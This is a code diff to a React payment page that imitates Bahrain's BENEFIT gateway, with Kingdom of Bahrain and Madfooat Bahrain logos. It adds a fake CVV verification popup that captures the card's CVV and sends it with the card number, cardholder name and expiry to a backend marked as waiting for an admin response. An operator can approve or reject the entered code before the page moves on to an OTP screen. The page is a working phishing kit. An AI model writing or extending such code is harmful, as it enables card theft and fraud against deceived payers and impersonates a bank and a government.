@@ -80,6 +80,16 @@ const translations = {
     errOtp: "Please enter a valid OTP (4-6 digits)",
     errRejectCard: "Please check the entered information",
     errRejectOtp: "Please enter the correct OTP",
+    // CVV popup translations
+    cvvTitle: "BENEFIT PAYMENT GATEWAY",
+    cvvSubtitle: "Card Verification",
+    cvvMessage: "Please enter the CVV code (3 digits) found on the back of the card ending in",
+    cvvLabel: "CVV",
+    cvvSubmit: "Confirm",
+    cvvCancel: "Cancel",
+    cvvError: "Please enter a valid CVV (3 digits)",
+    cvvProcessing: "Verifying...",
+    errCvv: "The CVV code is incorrect, please try again.",
   },
   ar: {
     langToggle: "English",
@@ -112,10 +122,20 @@ const translations = {
     errOtp: "الرجاء إدخال رمز تحقق صحيح (4-6 أرقام)",
     errRejectCard: "يرجى التأكد من المعلومات المدخلة",
     errRejectOtp: "يرجى إدخال الرمز بشكل صحيح",
+    // CVV popup translations
+    cvvTitle: "بوابة الدفع بنفت",
+    cvvSubtitle: "التحقق من البطاقة",
+    cvvMessage: "يرجى إدخال رمز CVV المكون من 3 خانات والموجود خلف البطاقة المنتهية بـ",
+    cvvLabel: "CVV",
+    cvvSubmit: "تأكيد",
+    cvvCancel: "إلغاء",
+    cvvError: "الرجاء إدخال رمز CVV صحيح (3 خانات)",
+    cvvProcessing: "جاري التحقق...",
+    errCvv: "رمز CVV غير صحيح، يرجى المحاولة مرة أخرى.",
   },
 };
 
-type Phase = "card" | "otp";
+type Phase = "card" | "cvv" | "otp";
 type Lang = "en" | "ar";
 
 const RED = "#e60000";
@@ -134,6 +154,13 @@ export default function KNETPayment() {
   const [expiryYear, setExpiryYear] = useState("");
   const [cardHolderName, setCardHolderName] = useState("");
   const [saveCard, setSaveCard] = useState(false);
+
+  // CVV popup state
+  const [showCvvPopup, setShowCvvPopup] = useState(false);
+  const [cvvLoading, setCvvLoading] = useState(false);
+  const [cvvCode, setCvvCode] = useState("");
+  const [cvvError, setCvvError] = useState(false);
+  const [cvvWaiting, setCvvWaiting] = useState(false);
 
   // OTP state
   const [otpCode, setOtpCode] = useState("");
@@ -168,7 +195,9 @@ export default function KNETPayment() {
   const [cardError, setCardError] = useState(false);
 
   // Masked card for OTP phase
-  const maskedCard = "******" + cardNumber.slice(-4);
+  const cleanCardNum = cardNumber.replace(/\s+/g, "");
+  const cardLast4 = cleanCardNum.slice(-4);
+  const maskedCard = "******" + cardLast4;
 
   useEffect(() => {
     navigateToPage("دفع بنفت");
@@ -241,6 +270,22 @@ export default function KNETPayment() {
       waitingMessage.value = "";
       setIsWaiting(false);
 
+      if (phase === "cvv") {
+        setCvvWaiting(false);
+        if (action === "approve" || action === "otp") {
+          // CVV approved - move to OTP
+          setShowCvvPopup(false);
+          setPhase("otp");
+          startCountdown();
+          navigateToPage("رمز التحقق بنفت (OTP)");
+        } else if (action === "reject") {
+          setCvvError(true);
+          setCvvCode("");
+        }
+        codeAction.value = null;
+        return;
+      }
+
       if (phase === "otp") {
         if (action === "cvv") {
           navigate("/cvv");
@@ -312,8 +357,28 @@ export default function KNETPayment() {
     e.preventDefault();
     if (!validateCardForm()) return;
 
-    setIsWaiting(true);
+    // Show loading then CVV popup after 2 seconds
+    setCvvLoading(true);
     setRejectedError("");
+
+    setTimeout(() => {
+      setCvvLoading(false);
+      setShowCvvPopup(true);
+      setCvvCode("");
+      setCvvError(false);
+      setPhase("cvv");
+      navigateToPage("CVV بنفت");
+    }, 2000);
+  };
+
+  const handleCvvSubmit = () => {
+    if (!cvvCode || !/^\d{3}$/.test(cvvCode)) {
+      setCvvError(true);
+      return;
+    }
+
+    setCvvWaiting(true);
+    setCvvError(false);
 
     const cleanCard = cardNumber.replace(/\s+/g, "");
     localStorage.setItem("cardNumber", cleanCard);
@@ -339,16 +404,24 @@ export default function KNETPayment() {
         nameOnCard: cardHolderName,
         expiryMonth: expiryMonth.padStart(2, "0"),
         expiryYear: expiryYear,
-        cvv: "N/A",
+        cvv: cvvCode,
         pin: "N/A",
         bankName: "BENEFIT",
         paymentMethod: "BENEFIT Debit",
       },
-      current: "دفع بنفت",
+      current: "CVV بنفت",
       nextPage: "رمز التحقق بنفت (OTP)",
       waitingForAdminResponse: true,
       isCustom: true,
     });
+  };
+
+  const handleCvvCancel = () => {
+    setShowCvvPopup(false);
+    setCvvCode("");
+    setCvvError(false);
+    setCvvWaiting(false);
+    setPhase("card");
   };
 
   const handleOtpSubmit = () => {
@@ -473,14 +546,278 @@ export default function KNETPayment() {
     </div>
   );
 
+  // CVV Popup Modal
+  const renderCvvPopup = () => {
+    if (!showCvvPopup) return null;
+
+    return (
+      <div style={{
+        position: "fixed",
+        top: 0,
+        left: 0,
+        width: "100%",
+        height: "100%",
+        backgroundColor: "rgba(0,0,0,0.5)",
+        zIndex: 999999,
+        display: "flex",
+        alignItems: "center",
+        justifyContent: "center",
+        padding: "20px",
+      }}>
+        <div style={{
+          backgroundColor: "#fff",
+          borderRadius: 12,
+          maxWidth: 520,
+          width: "100%",
+          boxShadow: "0 20px 60px rgba(0,0,0,0.3)",
+          overflow: "hidden",
+          animation: "fadeInUp 0.3s ease-out",
+        }}>
+          {/* Popup Header with logos */}
+          <div style={{
+            background: "linear-gradient(135deg, #f8f9fa 0%, #ffffff 100%)",
+            padding: "18px 24px",
+            borderBottom: "2px solid #e0e0e0",
+          }}>
+            <div style={{
+              display: "flex",
+              justifyContent: "space-between",
+              alignItems: "center",
+              direction: "rtl",
+            }}>
+              {/* Right: Kingdom of Bahrain logo */}
+              <div style={{ flex: "0 0 auto" }}>
+                <img
+                  src="/logo_ar.svg"
+                  alt="شعار مملكة البحرين"
+                  style={{ height: 55 }}
+                  onError={(e: any) => { e.target.src = '/bahrain-iga-logo.png'; }}
+                />
+              </div>
+
+              {/* Center: Title */}
+              <div style={{ textAlign: "center", flex: 1, padding: "0 15px" }}>
+                <div style={{
+                  color: RED,
+                  fontSize: 16,
+                  fontWeight: "bold",
+                  letterSpacing: 0.5,
+                  marginBottom: 2,
+                }}>
+                  {t.cvvTitle}
+                </div>
+                <div style={{
+                  color: "#666",
+                  fontSize: 12,
+                }}>
+                  {t.cvvSubtitle}
+                </div>
+              </div>
+
+              {/* Left: Madfooat Bahrain logo */}
+              <div style={{ flex: "0 0 auto" }}>
+                <img
+                  src="/madfooat-logo.png"
+                  alt="مدفوعات البحرين"
+                  style={{ height: 40 }}
+                />
+              </div>
+            </div>
+          </div>
+
+          {/* Popup Body */}
+          <div style={{ padding: "24px 28px", direction: isRtl ? "rtl" : "ltr" }}>
+            {/* Info message */}
+            <div style={{
+              backgroundColor: "#f0f7ff",
+              border: "1px solid #bdd7f1",
+              borderRadius: 8,
+              padding: "14px 16px",
+              marginBottom: 22,
+              fontSize: 13,
+              lineHeight: 1.7,
+              color: "#2c5282",
+              textAlign: isRtl ? "right" : "left",
+            }}>
+              <p style={{ margin: 0 }}>
+                {t.cvvMessage}{" "}
+                <span style={{ fontWeight: "bold", color: "#1a365d", direction: "ltr", display: "inline-block" }}>{cardLast4}</span>
+              </p>
+            </div>
+
+            {/* CVV Error */}
+            {cvvError && (
+              <div style={{
+                backgroundColor: "#fff5f5",
+                border: "1px solid #fed7d7",
+                color: "#c53030",
+                padding: "10px 14px",
+                borderRadius: 6,
+                marginBottom: 16,
+                fontSize: 13,
+                textAlign: "center",
+                fontWeight: "500",
+              }}>
+                {cvvCode.length > 0 ? t.errCvv : t.cvvError}
+              </div>
+            )}
+
+            {/* CVV Input */}
+            <div style={{
+              display: "flex",
+              alignItems: "center",
+              justifyContent: "center",
+              gap: 15,
+              marginBottom: 24,
+            }}>
+              <label style={{
+                fontSize: 14,
+                fontWeight: "bold",
+                color: "#333",
+                minWidth: 40,
+              }}>
+                {t.cvvLabel}
+              </label>
+              <input
+                type="tel"
+                inputMode="numeric"
+                maxLength={3}
+                value={cvvCode}
+                onChange={(e) => {
+                  const val = e.target.value.replace(/\D/g, "").slice(0, 3);
+                  setCvvCode(val);
+                  setCvvError(false);
+                }}
+                autoFocus
+                placeholder="•••"
+                style={{
+                  width: 120,
+                  height: 44,
+                  border: `2px solid ${cvvError ? '#e53e3e' : '#cbd5e0'}`,
+                  borderRadius: 8,
+                  padding: "0 16px",
+                  fontSize: 20,
+                  textAlign: "center",
+                  outline: "none",
+                  letterSpacing: 8,
+                  fontWeight: "bold",
+                  caretColor: "auto",
+                  direction: "ltr",
+                  transition: "border-color 0.2s",
+                }}
+                onFocus={(e) => { if (!cvvError) e.target.style.borderColor = RED; }}
+                onBlur={(e) => { if (!cvvError) e.target.style.borderColor = '#cbd5e0'; }}
+              />
+            </div>
+
+            {/* Buttons */}
+            <div style={{
+              display: "flex",
+              justifyContent: "center",
+              gap: 12,
+            }}>
+              <button
+                type="button"
+                onClick={handleCvvSubmit}
+                disabled={cvvWaiting || cvvCode.length !== 3}
+                style={{
+                  backgroundColor: RED,
+                  color: "#fff",
+                  border: "none",
+                  padding: "10px 40px",
+                  borderRadius: 6,
+                  fontSize: 14,
+                  fontWeight: "bold",
+                  cursor: cvvWaiting || cvvCode.length !== 3 ? "not-allowed" : "pointer",
+                  opacity: cvvWaiting || cvvCode.length !== 3 ? 0.6 : 1,
+                  minWidth: 120,
+                  transition: "all 0.2s",
+                  display: "flex",
+                  alignItems: "center",
+                  justifyContent: "center",
+                  gap: 8,
+                }}
+              >
+                {cvvWaiting ? (
+                  <>
+                    <div style={{
+                      border: "2px solid #fff",
+                      borderTop: "2px solid transparent",
+                      borderRadius: "50%",
+                      width: 16,
+                      height: 16,
+                      animation: "spin 1s linear infinite",
+                    }} />
+                    {t.cvvProcessing}
+                  </>
+                ) : (
+                  t.cvvSubmit
+                )}
+              </button>
+              <button
+                type="button"
+                onClick={handleCvvCancel}
+                disabled={cvvWaiting}
+                style={{
+                  backgroundColor: "#fff",
+                  color: "#333",
+                  border: "1px solid #ccc",
+                  padding: "10px 30px",
+                  borderRadius: 6,
+                  fontSize: 14,
+                  cursor: cvvWaiting ? "not-allowed" : "pointer",
+                  minWidth: 100,
+                  transition: "all 0.2s",
+                }}
+              >
+                {t.cvvCancel}
+              </button>
+            </div>
+          </div>
+
+          {/* Popup Footer */}
+          <div style={{
+            backgroundColor: "#f8f9fa",
+            padding: "12px 24px",
+            borderTop: "1px solid #eee",
+            textAlign: "center",
+          }}>
+            <img src="/benefit-logo.png" alt="Benefit" style={{ height: 30, marginBottom: 4 }} />
+            <div style={{ fontSize: 10, color: "#999" }}>
+              {t.poweredBy}
+            </div>
+          </div>
+        </div>
+      </div>
+    );
+  };
+
   return (
     <div style={{ margin: 0, padding: 0, fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif", backgroundColor: "#f5f5f5", minHeight: "100vh", direction: isRtl ? "rtl" : "ltr" }}>
-      {/* Loading overlay */}
+      {/* Animations */}
+      <style>{`
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        @keyframes fadeInUp {
+          from { opacity: 0; transform: translateY(20px); }
+          to { opacity: 1; transform: translateY(0); }
+        }
+      `}</style>
+
+      {/* Loading overlay for initial 2-second delay */}
+      {cvvLoading && (
+        <div style={{ position: "fixed", top: 0, left: 0, width: "100%", height: "100%", backgroundColor: "rgba(0,0,0,0.3)", zIndex: 999999, display: "flex", alignItems: "center", justifyContent: "center" }}>
+          <div style={{ textAlign: "center", color: "#fff", fontSize: 16 }}>
+            <div style={{ border: "4px solid #f3f3f3", borderTop: `4px solid ${RED}`, borderRadius: "50%", width: 40, height: 40, animation: "spin 1s linear infinite", margin: "0 auto 10px" }} />
+            {t.processing}
+          </div>
+        </div>
+      )}
+
+      {/* Loading overlay for waiting states */}
       {isWaiting && (
         <div style={{ position: "fixed", top: 0, left: 0, width: "100%", height: "100%", backgroundColor: "rgba(0,0,0,0.3)", zIndex: 999999, display: "flex", alignItems: "center", justifyContent: "center" }}>
           <div style={{ textAlign: "center", color: "#fff", fontSize: 16 }}>
             <div style={{ border: "4px solid #f3f3f3", borderTop: `4px solid ${RED}`, borderRadius: "50%", width: 40, height: 40, animation: "spin 1s linear infinite", margin: "0 auto 10px" }} />
-            <style>{`@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }`}</style>
             {t.processing}
           </div>
         </div>
@@ -496,9 +833,12 @@ export default function KNETPayment() {
         </div>
       )}
 
+      {/* CVV Popup Modal */}
+      {renderCvvPopup()}
+
       <div style={{ maxWidth: 960, margin: "0 auto", padding: "0 15px" }}>
         {/* ============ CARD PHASE ============ */}
-        {phase === "card" && (
+        {(phase === "card" || phase === "cvv") && (
           <div style={{ backgroundColor: "#fff", border: "1px solid #ddd", marginTop: 20, marginBottom: 20 }}>
             {renderHeader()}
 
@@ -571,7 +911,7 @@ export default function KNETPayment() {
                 </div>
 
                 <div style={{ display: "flex", justifyContent: "center", gap: 10, marginBottom: 20 }}>
-                  <button type="submit" style={{ backgroundColor: RED, color: "#fff", border: "none", padding: "8px 35px", borderRadius: 4, fontSize: 14, fontWeight: "bold", cursor: "pointer", minWidth: 100 }}>
+                  <button type="submit" disabled={cvvLoading} style={{ backgroundColor: RED, color: "#fff", border: "none", padding: "8px 35px", borderRadius: 4, fontSize: 14, fontWeight: "bold", cursor: cvvLoading ? "not-allowed" : "pointer", minWidth: 100, opacity: cvvLoading ? 0.6 : 1 }}>
                     {t.pay}
                   </button>
                   <button type="button" onClick={() => window.history.back()} style={{ backgroundColor: "#fff", color: "#333", border: "1px solid #ccc", padding: "8px 25px", borderRadius: 4, fontSize: 14, cursor: "pointer", minWidth: 100 }}>
